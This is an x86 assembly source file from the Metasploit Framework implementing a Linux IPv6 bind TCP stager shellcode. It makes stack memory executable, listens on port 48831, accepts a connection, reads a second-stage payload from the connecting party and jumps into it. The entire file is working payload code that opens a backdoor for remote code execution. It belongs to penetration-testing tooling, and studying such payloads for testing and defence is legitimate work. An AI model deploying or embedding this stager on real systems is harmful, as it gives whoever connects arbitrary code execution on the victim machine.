;;
;
;        Name: stager_sock_bind6
;   Qualities: Can Have Nulls
;     Version: $Revision: 1607 $
;     License:
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        Implementation of a Linux portbind TCP stager.
;
;        File descriptor in edi.
;
; Meta-Information:
;
; meta-shortname=Linux Bind TCP Stager
; meta-description=Listen on a port for a connection and run a second stage
; meta-authors=skape <mmiller [at] hick.org>; egypt <egypt [at] metasploit.com>
; meta-os=linux
; meta-arch=ia32
; meta-category=stager
; meta-connection-type=bind
; meta-name=bind_ipv6_tcp
; meta-path=lib/Msf/PayloadComponent/Linux/ia32/BindStager.pm
;;
BITS   32
GLOBAL _start

_start:

; int mprotect(const void *addr, size_t len, int prot);
mprotect:
	push byte 0x7d     ; __NR_mprotect
	pop  eax
	cdq
	mov  dl, 0x7       ; prot = 7 = PROT_READ | PROT_WRITE | PROT_EXEC
	mov  ecx, 0x1000   ; len  = PAGE_SIZE (on most systems)
	mov  ebx, esp      ; addr
	and  bx, 0xf000    ; ensure that addr is page-aligned
	int  0x80

	xor  ebx, ebx      ; ebx is the call argument to socketcall
	mul  ebx           ; set edx:eax to 0, we'll need them in a minute

; int socket(int domain, int type, int protocol);
socket:
	push ebx           ; protocol = 0 = first that matches this type and domain, i.e. tcp
	inc  ebx           ; 1 = SYS_SOCKET
	push ebx           ; type     = 1 = SOCK_STREAM
	push byte 0xa      ; domain   = 0xa = AF_INET6
	mov  ecx, esp      ; socketcall args
	mov  al, 0x66      ; __NR_socketcall
	int  0x80
	; Server socket is now in eax. We'll push it to the stack in a sec and then
	; just reference it from there, no need to store it in a register

; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
bind:
	inc  ebx           ; 2 = SYS_BIND (this was PF_INET for the call to socket)
	; set up the sockaddr

	push edx           ; addr->sin6_scopeid = 0
	push edx           ; addr->sin6_addr = inet_pton("::0")
	push edx           ; ...
	push edx           ; ...
	push edx           ; ...
	push edx           ; addr->flowinfo = 0
	push 0xbfbf000a    ; addr->sin6_port = 0xbfbf
	                   ; addr->sin6_family = 0xa = AF_INET6
	mov  ecx, esp      ; socketcall args
	push byte 0x1c     ; addrlen
	push ecx           ; addr
	push eax           ; sockfd ; return value from socket(2) above
	mov  ecx, esp      ; socketcall args
	push byte 0x66     ; __NR_socketcall
	pop  eax
	int  0x80

listen:
	shl  ebx, 1        ; 4 = SYS_LISTEN
	mov  al, 0x66      ; __NR_socketcall
	int  0x80

; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
accept:
	inc  ebx           ; 5 = SYS_ACCEPT
	mov  al, 0x66      ; __NR_socketcall
	mov  [ecx+4], edx
	int  0x80
	xchg eax, ebx

%ifndef USE_SINGLE_STAGE

; ssize_t read(int fd, void *buf, size_t count);
recv:
	; fd  = ebx
	; buf = ecx is pointing somewhere in the stack
	mov  dh, 0xc       ; count = 0xc00
	mov  al, 0x3       ; __NR_read
	int  0x80
	mov  edi, ebx      ; not necessary if second stages use ebx instead of edi
	                   ; for fd
	jmp  ecx

%else
	%ifdef FD_REG_EDI
	mov  edi, ebx
	%endif
%endif
